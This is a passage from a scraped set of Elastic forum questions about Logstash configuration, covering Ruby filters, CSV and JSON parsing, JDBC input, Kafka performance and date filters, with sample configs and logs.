    "url": "https://discuss.elastic.co/t/ruby-loop-on-arrayof-hashes-how-to-add-another-entry-to-the-hash/228639",
    "title": "Ruby loop on arrayof hashes - how to add another entry to the hash",
    "category": [
      "Logstash"
    ],
    "author": "stuart475898",
    "date": "April 18, 2020, 12:16pm April 19, 2020, 7:13am April 19, 2020, 7:20am",
    "body": "Hello, I've burnt a few hours on this.... I want to ingest information via SNMP from a network switch. I have successfully configured logstash to grab these data, and now I want to do some filtering before firing it into ES. The input results in an array of hashes - example below. Because {balh}.ifAlias does not always contain a value, I want to update it with the value of {blah}.ifDescr when it does not. Could anybody help please? I have the following Ruby so far: ruby { code => \"event.get('interfaces').each do |key,interface| if interface['iso.org.dod.internet.mgmt.mib-2.ifMIB.ifMIBObjects.ifXTable.ifXEntry.ifAlias'] == '' ??? end end\" } I'm not sure how I can update the value of {blah}.ifAlias if it is blank? Apologies I haven't put what I have tried so far, but this is one of those problems where I have tried about 50 different things and none have worked. Any suggestions please? I've included an example input below: \"interfaces\" => [ [ 0] { \"index\" => \"1\", \"iso.org.dod.internet.mgmt.mib-2.interfaces.ifTable.ifEntry.ifOutDiscards\" => 146096, \"ifAdminStatus\" => \"Up\", \"iso.org.dod.internet.mgmt.mib-2.ifMIB.ifMIBObjects.ifXTable.ifXEntry.ifHCOutUcastPkts\" => 1297794267, \"iso.org.dod.internet.mgmt.mib-2.interfaces.ifTable.ifEntry.ifPhysAddress\" => \"fc:ec:da:04:de:21\", \"iso.org.dod.internet.mgmt.mib-2.ifMIB.ifMIBObjects.ifXTable.ifXEntry.ifHCInUcastPkts\" => 1726174182, \"iso.org.dod.internet.mgmt.mib-2.interfaces.ifTable.ifEntry.ifIndex\" => 1, \"iso.org.dod.internet.mgmt.mib-2.ifMIB.ifMIBObjects.ifXTable.ifXEntry.ifHCInMulticastPkts\" => 1628743, \"iso.org.dod.internet.mgmt.mib-2.interfaces.ifTable.ifEntry.ifAdminStatus\" => 1, \"iso.org.dod.internet.mgmt.mib-2.interfaces.ifTable.ifEntry.ifMtu\" => 1518, \"iso.org.dod.internet.mgmt.mib-2.ifMIB.ifMIBObjects.ifXTable.ifXEntry.ifHCOutOctets\" => 1046925983452, \"ifOperationalStatus\" => \"Up\", \"iso.org.dod.internet.mgmt.mib-2.interfaces.ifTable.ifEntry.ifOperStatus\" => 1, \"iso.org.dod.internet.mgmt.mib-2.ifMIB.ifMIBObjects.ifXTable.ifXEntry.ifHCInOctets\" => 2205815878493, \"iso.org.dod.internet.mgmt.mib-2.interfaces.ifTable.ifEntry.ifDescr\" => \"Slot: 0 Port: 1 Gigabit - Level\", \"iso.org.dod.internet.mgmt.mib-2.interfaces.ifTable.ifEntry.ifInErrors\" => 0, \"iso.org.dod.internet.mgmt.mib-2.ifMIB.ifMIBObjects.ifXTable.ifXEntry.ifHCOutBroadcastPkts\" => 10995020, \"iso.org.dod.internet.mgmt.mib-2.ifMIB.ifMIBObjects.ifXTable.ifXEntry.ifConnectorPresent\" => 1, \"iso.org.dod.internet.mgmt.mib-2.interfaces.ifTable.ifEntry.ifInDiscards\" => 0, \"iso.org.dod.internet.mgmt.mib-2.interfaces.ifTable.ifEntry.ifOutErrors\" => 0, \"iso.org.dod.internet.mgmt.mib-2.ifMIB.ifMIBObjects.ifXTable.ifXEntry.ifPromiscuousMode\" => 1, \"iso.org.dod.internet.mgmt.mib-2.ifMIB.ifMIBObjects.ifXTable.ifXEntry.ifAlias\" => \"\", \"iso.org.dod.internet.mgmt.mib-2.ifMIB.ifMIBObjects.ifXTable.ifXEntry.ifHCInBroadcastPkts\" => 890065, \"iso.org.dod.internet.mgmt.mib-2.ifMIB.ifMIBObjects.ifXTable.ifXEntry.ifHCOutMulticastPkts\" => 2013721, \"iso.org.dod.internet.mgmt.mib-2.interfaces.ifTable.ifEntry.ifType\" => 6, \"iso.org.dod.internet.mgmt.mib-2.interfaces.ifTable.ifEntry.ifSpeed\" => 1000000000, \"iso.org.dod.internet.mgmt.mib-2.interfaces.ifTable.ifEntry.ifLastChange\" => 564080300, \"iso.org.dod.internet.mgmt.mib-2.ifMIB.ifMIBObjects.ifXTable.ifXEntry.ifHighSpeed\" => 1000 }, [...] ]",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "96b5d980-97ea-40ea-82eb-03cedd39951a",
    "url": "https://discuss.elastic.co/t/http-post-with-csv/228052",
    "title": "HTTP POST with CSV",
    "category": [
      "Logstash"
    ],
    "author": "karnamonkster",
    "date": "April 15, 2020, 8:03am April 16, 2020, 4:34am April 18, 2020, 2:40am April 19, 2020, 4:07am",
    "body": "Hi , This is in connection with one of the issues here I have a typical scenario where i am not able to find this thing working. I could see the message at the other end (tested with localhost running : nc -l -k port) but i dont get a file created at the location given under header attribute as \"Filename\" Here is my output header part for reference. url => \"https://IP?FQDN\" http_method => \"post\" content_type => \"application/octet-stream\" format => \"form\" headers => [ \"User-Agent\" => \"Model/ewdsaasa/Hardware/R1D Serial/123455 Application/1.1.21.3/66:77:88:99:00:A4\" \"Connection\" => \"close\" \"Authorization\" => \"Basic Y3VjdWx1czpjdWN1bHVz\" \"Filename\" => \"123455_valuereport_%{device-identification}_3111.csv\" \"Product-Name\" => \" \" \"Host\" => \"IPorFQDN\" \"Accept\" => \"text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2\" \"Content-Length\" => \"597\" ]",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "97dea992-f9fa-4c6b-9125-a97cb1f9a82c",
    "url": "https://discuss.elastic.co/t/logstash-and-journald/228672",
    "title": "Logstash and journald",
    "category": [
      "Logstash"
    ],
    "author": "elastic_user1",
    "date": "April 18, 2020, 6:31pm",
    "body": "I noticed I could not see all Logstash logs in journalctl -f -u logstash. I have some pipelines with stdout (ruby debug). How can I get all my separate pipelines' logs into the files. I can see only the messages that Logstash is started in the log files. My log4j and systemd files are Debian native ones. My logstash.yml path.logs: /var/log/logstash pipeline.separate_logs: true",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "c118c685-90a8-4125-9f00-a6ef30592406",
    "url": "https://discuss.elastic.co/t/load-data-from-mysql-to-elasticsearch-with-logstash/228665",
    "title": "Load data from mysql to elasticsearch with logstash",
    "category": [
      "Logstash"
    ],
    "author": "hiba",
    "date": "April 18, 2020, 5:43pm",
    "body": "Hi, I want to load data from mysql ( mysql wampserver ) into elasticsearch via logstash. After downloading elasticsearch ,kibana and logstash ,i installed \"com.mysql.jdbc_5.1.5\" (JDBC). test.conf input { jdbc { jdbc_connection_string =>\"\"jdbc:mysql://localhost:3306/giata_db\"\" jdbc_user => \"root\" jdbc_password => \"\" jdbc_driver_library => \"C:\\Users\\hiba\\OneDrive\\ELK\\logstash-7.0.0\\logstash-7.0.0\\bin\\com.mysql.jdbc_5.1.5.jar\" jdbc_driver_class => \"com.mysql.jdbc.Driver\" statement => \"SELECT * FROM countries\" } } output{ elasticsearch{ hosts => [\"localhost:9200\"] index => \"voyage2000\" } stdout { codec => rubydebug } } Capturelog1352×198 14.7 KB any help please !",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "34dddd2d-da4c-4cdf-84d6-3694bde44379",
    "url": "https://discuss.elastic.co/t/logstash-add-tag-if-message-starts-with/228607",
    "title": "Logstash Add Tag if Message Starts With",
    "category": [
      "Logstash"
    ],
    "author": "ericbarnes",
    "date": "April 18, 2020, 2:40am April 18, 2020, 5:08pm",
    "body": "We are using the Jenkins logstash plugin. So the logstash config is just an input and ouput. The plugin sends pre-formatted json, so not much to do besides collect and forward. We want to enrich based off the type of log sent to the Jenkins console. We are attempting to add a tag to Jenkins console logs if the message output start with a particular character. The message could start with an I, W, or E and we want to say \"if message starts with W, add tag \"warning\" or \"if message starts with E, add tag \"error.\" How can i add a filter that says, \"if it starts with x, add y, OR if is starts x1 add y1, OR if it starts with x2 add y2, else just pass the message through? Example message fields: W0418 02:00:29.358414 74475 Report.cc:188] Total Duration : 6 min, 24 secs I0418 02:00:29.358414 74475 Report.cc:188] Total Duration : 6 min, 24 secs E0418 02:00:29.358414 74475 Report.cc:188] Total Duration : 6 min, 24 secs",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "a6975aa2-ccef-4076-baa0-1d20db0cc99f",
    "url": "https://discuss.elastic.co/t/how-do-i-take-multiple-csv-files-into-a-single-elasticsearch-index-using-logstash/228661",
    "title": "How do I take multiple CSV files into a single Elasticsearch index using logstash?",
    "category": [
      "Logstash"
    ],
    "author": "Drashti_Shah",
    "date": "April 18, 2020, 4:53pm",
    "body": "I have two CSV files in which, CSV 1 (student_master) has the following fields: Student ID, First Name, Gender, State and in CSV 2,(student_marks_data) I have Student ID, Date, Math, Physics, Chemistry, Total, Percentage and Grade. I need to create a logstash data adapter to load the csv_1 into an Elasticsearch index called “student_master”. While loading the student marks data, I have to link with “student_master” index (created in previous step) based on the student_id column and fetch the student’s firstname, lastname, gender and load into a new index namely “student_marks_[current_date]”. I need the output as an index in which it is one index I have Student ID, Name, Gender, Date, Math, Physics, Chemistry, Total, Percentage and Grade. I tried the below code: input { file { type => \"csv1\" path => \"/home/vunet/Downloads/student_master.csv\" start_position => \"beginning\" sincedb_path => \"/dev/null\" } file { type => \"csv2\" path => \"/home/vunet/Downloads/student_marks_new.csv\" start_position => \"beginning\" sincedb_path => \"/dev/null\" } } filter { if [type] == \"csv1\"{ csv { columns => [ \"ID\", \"First name\", \"Last name\", \"Gender\", \"City\", \"State\" ] remove_field => [\"City\", \"State\"] } } if [type] == \"csv2\"{ csv { columns => [ \"ID\", \"Date\", \"Chemistry\", \"Physics\", \"Biology\", \"Total\", \"Percentage\", \"Grade\" ] remove_field => [\"ID\"] } date { match => [\"Date\", \"dd/MM/yyyy\"] target => \"@timestamp\" } }} output { # elasticsearch { # doc_as_upsert => true # document_type => \"doc\" # index => \"students-new-%{+YYYY.MM.dd}\" # } stdout { codec => rubydebug } } How do I make a join (in SQL words) or how do I map with the ID of one CSV with the ID of the second CSV to create a single index? Please do help. Thank you in advance.",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "8f3928ed-92e2-4329-b60c-241f5e72a8ba",
    "url": "https://discuss.elastic.co/t/returning-multiple-events-from-ruby-plugin/227577",
    "title": "Returning Multiple Events from Ruby Plugin",
    "category": [
      "Logstash"
    ],
    "author": "mdt",
    "date": "April 11, 2020, 4:45am April 18, 2020, 9:48am",
    "body": "I need to parse some incoming messages where for network reasons, one event as seen by Logstash is really a concatenation of multiple events. To do that I'm trying to use the ruby plugin, breaking the initial message into pieces, with the idea, at least, of passing those on to the remainder of the pipeline. The syntax is more complicated than the split filter plug-in can handle, but the goal is essentially the same. The documentation for the ruby plugin (3.1.5 -- the version I am using) says I need to use new_event_block.call(newevent) to create events, however in Logstash 7.6.1, at least, this generates an error: Could not process event: undefined local variable or method `new_event_block' for #<LogStash::Filters::Ruby::Script::ExecutionContext:0x47f06865> As an alternative, I tried creating an array containing the events and just returning that, but what happens in practice is that the array just grows and grows, and is never passed to the rest of the pipeline. What's the best way to do this? Is the documentation simply wrong, or is some additional undocumented setup needed before I can use new_event_block? Thanks!",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "4ace5301-2388-494d-9496-554e28da79e2",
    "url": "https://discuss.elastic.co/t/convert-0-50-to-float-converts-it-to-0-00/228561",
    "title": "Convert $0.50 to float converts it to 0.00",
    "category": [
      "Logstash"
    ],
    "author": "Yaniv_Nuriel",
    "date": "April 17, 2020, 7:24pm April 17, 2020, 10:05pm April 17, 2020, 10:20pm April 18, 2020, 7:15am April 18, 2020, 7:15am",
    "body": "Hey all, Here are my load file: Spend,Bbb $0.55,100 $0.80,200 The conf.file is: input { file { path => \"/Users/yanivnuriel/logstash/data/ads/searchterms/us/one-line-15.txt\" start_position => \"beginning\" sincedb_path => \"NUL\" } } filter{ csv { separator => \",\" autogenerate_column_names => true columns => [\"Spend\", \"Bbb\"] } mutate{ convert => [\"Spend\",\"float\"] } } output { stdout { } } and the output is: Yanivs-MBP:logstash yanivnuriel$ logstash -f test.conf Sending Logstash logs to /usr/local/Cellar/logstash-full/7.6.2/libexec/logs which is now configured via log4j2.properties [2020-04-17T21:57:33,742][WARN ][logstash.config.source.multilocal] Ignoring the 'pipelines.yml' file because modules or command line options are specified [2020-04-17T21:57:34,760][INFO ][logstash.runner ] Starting Logstash {\"logstash.version\"=>\"7.6.2\"} [2020-04-17T21:57:45,914][INFO ][org.reflections.Reflections] Reflections took 209 ms to scan 1 urls, producing 20 keys and 40 values [2020-04-17T21:57:57,234][WARN ][org.logstash.instrument.metrics.gauge.LazyDelegatingGauge][main] A gauge metric of an unknown type (org.jruby.RubyArray) has been created for key: cluster_uuids. This may result in invalid serialization. It is recommended to log an issue to the responsible developer/development team. [2020-04-17T21:57:57,376][INFO ][logstash.javapipeline ][main] Starting pipeline {:pipeline_id=>\"main\", \"pipeline.workers\"=>4, \"pipeline.batch.size\"=>125, \"pipeline.batch.delay\"=>50, \"pipeline.max_inflight\"=>500, \"pipeline.sources\"=>[\"/Users/yanivnuriel/logstash/test.conf\"], :thread=>\"#<Thread:0x51fc8441 run>\"} [2020-04-17T21:58:03,907][INFO ][logstash.javapipeline ][main] Pipeline started {\"pipeline.id\"=>\"main\"} [2020-04-17T21:58:04,134][INFO ][logstash.agent ] Pipelines running {:count=>1, :running_pipelines=>[:main], :non_running_pipelines=>[]} [2020-04-17T21:58:04,153][INFO ][filewatch.observingtail ][main] START, creating Discoverer, Watch with file and sincedb collections [2020-04-17T21:58:06,089][INFO ][logstash.agent ] Successfully started Logstash API endpoint {:port=>9600} /usr/local/Cellar/logstash-full/7.6.2/libexec/vendor/bundle/jruby/2.5.0/gems/awesome_print-1.7.0/lib/awesome_print/formatters/base_formatter.rb:31: warning: constant ::Fixnum is deprecated { \"host\" => \"Yanivs-MBP\", \"Bbb\" => \"100\", \"message\" => \"$0.55,100\\r\", \"@version\" => \"1\", \"@timestamp\" => 2020-04-17T18:58:07.550Z, \"path\" => \"/Users/yanivnuriel/logstash/data/ads/searchterms/us/one-line-15.txt\", \"Spend\" => 0.0 } { \"host\" => \"Yanivs-MBP\", \"Bbb\" => \"Bbb\", \"message\" => \"﻿Spend,Bbb\\r\", \"@version\" => \"1\", \"@timestamp\" => 2020-04-17T18:58:07.431Z, \"path\" => \"/Users/yanivnuriel/logstash/data/ads/searchterms/us/one-line-15.txt\", \"Spend\" => 0.0 } { \"host\" => \"Yanivs-MBP\", \"Bbb\" => \"200\", \"message\" => \"$0.80,200\\r\", \"@version\" => \"1\", \"@timestamp\" => 2020-04-17T18:58:07.554Z, \"path\" => \"/Users/yanivnuriel/logstash/data/ads/searchterms/us/one-line-15.txt\", \"Spend\" => 0.0 As you can see the value in Spend is 0.0 instead of 0.55 and 0.8. Thanks Yaniv",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "265d9cab-21e7-466b-bcc0-06f1243915f5",
    "url": "https://discuss.elastic.co/t/help-in-parsing-json-log-file/228600",
    "title": "Help in Parsing JSON Log File",
    "category": [
      "Logstash"
    ],
    "author": "Osama_Samaan",
    "date": "April 17, 2020, 11:41pm April 18, 2020, 2:33am",
    "body": "Hi, Please need your help to parse log file contains entries with JSON formated entries , each has the same format as below example : { \"Buffer\": { \"timestamp\": \"2017-11-03 13:32:55.840817\", \"pcapfile\": \"file.pcap\", \"packetnumber\": 1 }, \"Ethernet[0]\": { \"ethernet_dst\": \"20:e5:2a:b6:93:f1\", \"ethernet_src\": \"00:08:02:1c:47:ae\", \"ethernet_type\": 2048 }, \"IP[1]\": { \"ip_dst\": \"10.11.3.1\", \"ip_flags\": 0, \"ip_version\": 4, \"ip_ihl\": 5, \"ip_id\": 4077, \"ip_frag\": 0, \"ip_chksum\": 4161, \"ip_len\": 67, \"ip_src\": \"10.11.3.102\", \"ip_ttl\": 128, \"ip_proto\": 17, \"ip_tos\": 0 }, \"UDP[2]\": { \"udp_dport\": 53, \"udp_sport\": 53052, \"udp_len\": 47, \"udp_chksum\": 63483 }, \"DNS[3]\": { \"dns_aa\": 0, \"dns_qdcount\": 1, \"dns_ancount\": 0, \"dns_id\": 14310, \"dns_nscount\": 0, \"dns_qr\": 0, \"dns_rcode\": 0, \"dns_ra\": 0, \"dns_rd\": 1, \"dns_opcode\": 0, \"dns_tc\": 0, \"dns_arcount\": 0, \"dns_z\": 0 }, \"DNS Question Record[4]\": { \"dns_question_record_qname\": \"viciouscontroller.com.\", \"dns_question_record_qtype\": 1, \"dns_question_record_qclass\": 1 } } Thanks in advance",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "2a5e615e-f17e-4fd8-b72b-1117642a02ae",
    "url": "https://discuss.elastic.co/t/ruby-exception-occurred-undefined-method-for-logstash-0x1f8ee438/228521",
    "title": "Ruby exception occurred: undefined method `[]' for #<LogStash::Event:0x1f8ee438",
    "category": [
      "Logstash"
    ],
    "author": "Jaikumar_Ganesan",
    "date": "April 17, 2020, 1:19pm April 17, 2020, 2:13pm April 17, 2020, 2:39pm April 17, 2020, 2:50pm April 17, 2020, 4:07pm April 17, 2020, 5:06pm April 18, 2020, 2:25am",
    "body": "I'm using logstash 7.5.1. I would like to parse through all fields of my logstash and convert field starting with the word \"time\" to float. Please find below my configuration: filter { # Parse Search Logs grok { match => [ \"message\", \"%{USERNAME:trans_id} %{USERNAME:trans_name} %{USERNAME:sub_trans_name} %{BASE16FLOAT:time_elapsed} %{USERNAME:trans_status} %{GREEDYDATA:payload}\" ] } # Extract the time based on the time of the query and # not the time the item got logged #date { # match => [ \"timestamp\", \"yyyy-MM-dd HH:mm:ss.SSSSSS\" ] #} # Drop the captured timestamp field since it has been moved to the # time of the event and drop user1 which are unwanted fields #mutate { # remove_field => [ \"timestamp\" ] #} mutate { add_field => { \"%{sub_trans_name}_trans_status\" => \"%{trans_status}\" } add_field => { \"%{sub_trans_name}_payload\" => \"%{payload}\" } add_field => { \"time_elapsed_%{sub_trans_name}\" => \"%{time_elapsed}\" } remove_field => [ \"sub_trans_name\", \"trans_status\", \"payload\" ] } ruby { code => \" event.to_hash.keys.each { |k| if k.start_with?('time') and event[k].is_a?(String) event[k] = event[k].to_float end } \" } } I get Ruby exception occurred: undefined method `' for #<LogStash::Event:0x1f8ee438 when i try to parse logs: Sample Log: 980f884e7a2f11 search pre-process 0.622 1 {question: hello} Any help would be great, as I have been stuck with this for the entire day.",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "b13981ce-eaa4-47a6-b8ad-a8c973f11b13",
    "url": "https://discuss.elastic.co/t/unable-to-install-logstash-plugin/228565",
    "title": "Unable to install logstash plugin",
    "category": [
      "Logstash"
    ],
    "author": "dranga",
    "date": "April 17, 2020, 11:03pm",
    "body": "Hi, I am new to JRuby and Logstash. I am trying to setup Logstash locally and install some custom plugins. I added my custom plugins to the Gemfile and tried running bin/logstash-plugin the following way: ~/logstash-6.4.2|⇒ bin/logstash-plugin install --no-verify Error: Could not find or load main class org.jruby.Main ~/logstash-6.4.2|⇒ java -version java version \"1.8.0_241\" Java(TM) SE Runtime Environment (build 1.8.0_241-b07) Java HotSpot(TM) 64-Bit Server VM (build 25.241-b07, mixed mode) ~/logstash-6.4.2|⇒ which jruby /Users/dranga/.rbenv/shims/jruby ~/logstash-6.4.2|⇒ jruby -v jruby 9.2.11.1 (2.5.7) 2020-03-25 b1f55b1a40 Java HotSpot(TM) 64-Bit Server VM 25.241-b07 on 1.8.0_241-b07 +jit [darwin-x86_64] ~/logstash-6.4.2|⇒ echo $PATH /Users/dranga/.rbenv/shims:/usr/local/bin:/usr/local/sbin:/Users/dranga/bin::/usr/bin:/bin:/usr/sbin:/sbin ~|⇒ which gem /Users/dranga/.rbenv/shims/gem ~|⇒ which bundle /Users/dranga/.rbenv/shims/bundle I installed jruby using rbenv. Can you please help me understand what could be causing \"Error: Could not find or load main class org.jruby.Main\" when I have jruby available in my path?",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "e75519dc-6081-436c-9d90-5d922a60d785",
    "url": "https://discuss.elastic.co/t/nested-indexing-possible/228584",
    "title": "Nested indexing possible?",
    "category": [
      "Logstash"
    ],
    "author": "EliWallic",
    "date": "April 17, 2020, 9:21pm April 17, 2020, 10:07pm",
    "body": "Hi all, I have some plaintext logfiles which i want to have in a single event. For example: Start time: 20200417225004 property1: value1 property2: value2 property3: value3 property4: value4 Command start time: 20200417225016 property1: value1 property2: value2 Command start time: 20200417225023 property1: value1 property2: value2 property3: value3 The phrase 'Start time' should be the trigger for an event. All lines after are attached to this event. All lines after each 'Command start time' should be on the same level but in a sublevel of 'Start time' Something like this: Start time: 20200417225004 property1: value1 property2: value2 property3: value3 property4: value4 Command start time: 20200417225016 property1: value1 property2: value2 Command start time: 20200417225023 property1: value1 property2: value2 property3: value3 Is that possible? Best regards",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "51d30b36-3d66-4df0-936a-310c55928c08",
    "url": "https://discuss.elastic.co/t/script-params-via-logstash-is-it-possible/226586",
    "title": "Script params via Logstash, is it possible?",
    "category": [
      "Logstash"
    ],
    "author": "crickes",
    "date": "April 5, 2020, 6:30pm April 6, 2020, 8:25am April 6, 2020, 8:28am April 6, 2020, 9:12am April 15, 2020, 4:08pm April 16, 2020, 11:28pm April 17, 2020, 7:32pm April 17, 2020, 7:49pm",
    "body": "Is it possible to send 'params' to a stored script in Elasticsearch from Logstash, or do I have to use a script defined inline or as a file in Logstash in order to define a 'params' block for the script?",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "917986f2-0489-427d-903f-051a3bbc8be5",
    "url": "https://discuss.elastic.co/t/how-can-i-create-logstash-index-every-4-hours-except-1-hour/227928",
    "title": "How can i create logstash index every 4 hours except 1 hour",
    "category": [
      "Logstash"
    ],
    "author": "Dragon9",
    "date": "April 14, 2020, 1:49pm April 14, 2020, 9:07pm April 15, 2020, 8:35am April 15, 2020, 8:37am April 15, 2020, 8:48am April 15, 2020, 9:16am April 15, 2020, 9:19am April 15, 2020, 12:29pm April 16, 2020, 11:19am April 16, 2020, 11:31am April 16, 2020, 3:36pm April 17, 2020, 1:23am April 17, 2020, 8:16am April 17, 2020, 4:25pm",
    "body": "like output{ elasticsearch { index => \"logstash-%{+YYYY.MM.dd.hh}\" } } for example:- logstash-2020.04.14.07 logstash-2020.04.14.11",
    "website_area": "discuss",
    "replies": 14
  },
  {
    "id": "82f778a1-b6cd-46fc-b306-ec0bc1174b39",
    "url": "https://discuss.elastic.co/t/translate-filters-can-the-dictionary-file-include-a-range/228545",
    "title": "Translate Filters :: Can the Dictionary File Include a Range?",
    "category": [
      "Logstash"
    ],
    "author": "redapplesonly",
    "date": "April 17, 2020, 4:12pm",
    "body": "Hi Logstash Maestros, In my Logstash config file, I have a simple translate filter: filter { translate { field => \"[MyData][FieldA]\" destination => \"[MyData][FieldB]\" dictionary_path => \"/usr/share/logstash/config/MyDictionary.yaml\" fallback => \"UNKNOWN\" } } And MyDictionary.yaml is pretty simple: \"1\": Apples \"2\": Bananas \"3\": Cantaloupes All of this works great. The trouble is, I’ve just learned now any FieldA value between 10,000 and 100,000 should be translated into “Vegetables.” I could do something like this: filter { if [MyData][FieldA] >= 10000 and [MyData][FieldA] <= 100000 { mutate { add_field => { \"[MyData][FieldB]\" => 'Vegetables' } } } else { translate { field => \"[MyData][FieldA]\" destination => \"[MyData][FieldB]\" dictionary_path => \"/usr/share/logstash/config/MyDictionary.yaml\" fallback => \"UNKNOWN\" } } } But at my company, this requires a scheduled production change and an internal code review and is a big pain from a management standpoint. I could also expressly list every value between 10,000 and 100,000 within MyDictionary.yaml, but obviously that’s none too elegant either. I’d love a solution where I can just change MyDictionary.yaml and Logstash would understand the range, something like: \"1\": Apples \"2\": Bananas \"3\": Cantaloupes \"10000\" - \"100000\": Vegetables I get that this is unlikely to be the case, but I thought I’d pose the question. If you see a better solution, please suggest. Thank you!",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "5b44acf0-70d8-416e-af33-d353702e6d8c",
    "url": "https://discuss.elastic.co/t/missing-fields-in-kibana/227974",
    "title": "Missing fields in Kibana",
    "category": [
      "Logstash"
    ],
    "author": "inchirah",
    "date": "April 14, 2020, 10:22pm April 14, 2020, 11:42pm April 15, 2020, 8:21pm April 16, 2020, 10:57pm April 17, 2020, 1:27am April 17, 2020, 3:17pm April 17, 2020, 3:34pm",
    "body": "Hello, After I imported my CSV data in ES and when I search for my fields in devtools I couldn't find them all. This is my conf file : input{ file{ path => \"C:/Users/Asus/Dropbox/PFE_part2/MOOV_ALEPE_Data.csv\" start_position => \"beginning\" } } filter{ csv { columns => [ \"Message\", \"Time\", \"Distance\", \"Longitude\", \"Latitude\", \"NemoEvent_GPRS_DataConnectionSuccess_DAC\", \"NemoEvent_GPRS_DataConnectionAttempt_DAA\", \"NemoEvent_GPRS_DataDisconnect_DAD\" ] separator => \",\" } mutate {convert => [\"Longitude\", \"float\"]} mutate {convert => [\"Latitude\", \"float\"]} mutate {convert => [\"NemoEvent_GPRS_DataConnectionSuccess_DAC\", \"integer\"]} mutate {convert => [\"NemoEvent_GPRS_DataConnectionAttempt_DAA\", \"integer\"]} mutate {convert => [\"NemoEvent_GPRS_DataDisconnect_DAD\", \"integer\"]} } output{ elasticsearch { action => \"index\" hosts => [\"http://localhost:9200/\"] index => \"data-index-1\" document_type => \"data\" } stdout { } } This is what I typed in the dev tools : GET /data-index-1 { \"query\": { \"match_all\": {} } } And I only get : ( \"Message\", \"Time\", \"Distance\", \"Longitude\") { \"data-index-1\" : { \"aliases\" : { }, \"mappings\" : { \"properties\" : { \"@timestamp\" : { \"type\" : \"date\" }, \"@version\" : { \"type\" : \"text\", \"fields\" : { \"keyword\" : { \"type\" : \"keyword\", \"ignore_above\" : 256 } } }, \"Distance\" : { \"type\" : \"text\", \"fields\" : { \"keyword\" : { \"type\" : \"keyword\", \"ignore_above\" : 256 } } }, \"Longitude\" : { \"type\" : \"float\" }, \"Message\" : { \"type\" : \"text\", \"fields\" : { \"keyword\" : { \"type\" : \"keyword\", \"ignore_above\" : 256 } } }, \"Time\" : { \"type\" : \"text\", \"fields\" : { \"keyword\" : { \"type\" : \"keyword\", \"ignore_above\" : 256 } } }, \"host\" : { \"type\" : \"text\", \"fields\" : { \"keyword\" : { \"type\" : \"keyword\", \"ignore_above\" : 256 } } }, \"message\" : { \"type\" : \"text\", \"fields\" : { \"keyword\" : { \"type\" : \"keyword\", \"ignore_above\" : 256 } } }, \"path\" : { \"type\" : \"text\", \"fields\" : { \"keyword\" : { \"type\" : \"keyword\", \"ignore_above\" : 256 } } } } }, \"settings\" : { \"index\" : { \"creation_date\" : \"1586821638734\", \"number_of_shards\" : \"1\", \"number_of_replicas\" : \"1\", \"uuid\" : \"H4ZccR5BSFWyeD-aKzCgTA\", \"version\" : { \"created\" : \"7060299\" }, \"provided_name\" : \"data-index-1\" } } } } The other fields not exist. Could anyone tell me where is the problem and how I could solve it please?",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "d408b6e0-e868-4121-88c1-f50c6a0cb2c1",
    "url": "https://discuss.elastic.co/t/kafka-input-performance-problems/228541",
    "title": "Kafka Input Performance Problems",
    "category": [
      "Logstash"
    ],
    "author": "chris.murray",
    "date": "April 17, 2020, 3:14pm",
    "body": "I've been working to convert an ELK setup over to using Logstash as a parsing engine, from something home-grown (don't ask). I'm running into a problem with the performance of the Kafka input. Versions: Everything 7.6.x Logs go from rsyslog to a 6-node Kafka setup. I've played with different partition sizes but right now there are 24 partitions for the topic I care about. Replication factor 2. On the 6 nodes there is also a copy of Logstash. These nodes are 15 core, configured with 30 workers. Was originally default but upped it in an attempt to increase performance. The Kafka input has consumer_threads set to 4. My basic problem is I cannot pull from Kafka fast enough. If I use kafka-consumer-groups.sh to watch partition lag, it just goes up and up over time. I'm pushing between 30k-40k messages into Kafka in prod. Early on in this project my CPU's were pegged and I traced that to some bad groks. Now, my CPU's run maybe 40% average with most of my logstash threads idle. The problem is not: my Filters....I've checked them extensively and CPU usage is fine. my Elasticsearch back end I'm sending to. When I put the Logstash setup in play I can watch my ES setup ingest ~20k per second....but when not using logstash I have seen this system ingest well over 100k per second in tests. I've read so much conflicting information on having Logstash pull from Kafka. I need more, and am not sure how to accomplish it. Some things say more partitions, then some things say that's unlikely to help. I have idle CPU and want to put it to work What is the current recommendation for maximizing Kafka-pull-performance?",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "f7266bd3-2a27-4456-9d2d-8f75fede440f",
    "url": "https://discuss.elastic.co/t/logstash-date-filter-not-working-with-tab/228300",
    "title": "Logstash Date Filter Not Working with tab",
    "category": [
      "Logstash"
    ],
    "author": "Atul_Gunjal",
    "date": "April 16, 2020, 10:50am April 16, 2020, 1:45pm April 17, 2020, 10:55am April 17, 2020, 2:52pm",
    "body": "I need to parse event and time separated by tab using the date filter in logstash, but logstash failed to identify tab and gives an error grok{ patterns_dir => [\"./patterns\"] match => { \"message\" => \"%{TIMEFORMAT:eventtime}\\t%{WORD:typedata}\\t%{WORD:loglevel}\\t%{TIME}\\t%{HOSTNAME:hostmachine}\\t%{GREEDYDATA:serviceinfo}\\t%{SERVMSG}\" } } date{ match=>[\"eventtime\",\"yyyy-MM-dd\\tHH:mm:ss\"] } } TIMEFORMAT %{YEAR}-%{MONTHNUM}-%{MONTHDAY}\\t%{TIME} COMP %{WORD:componenttype}\\t%{GREEDYDATA:logmessage} SERVMSG %{COMP}|\\t%{GREEDYDATA:logmessage} SERVICEDATA %{WORD:environment}\\\\%{GREEDYDATA:machine}\\|%{POSINT:PID}\\|%{GREEDYDATA:service} \"Unable to configure plugins: Illegal pattern component: t\" So, How can I create the mapping for eventtime to date in logstash?",
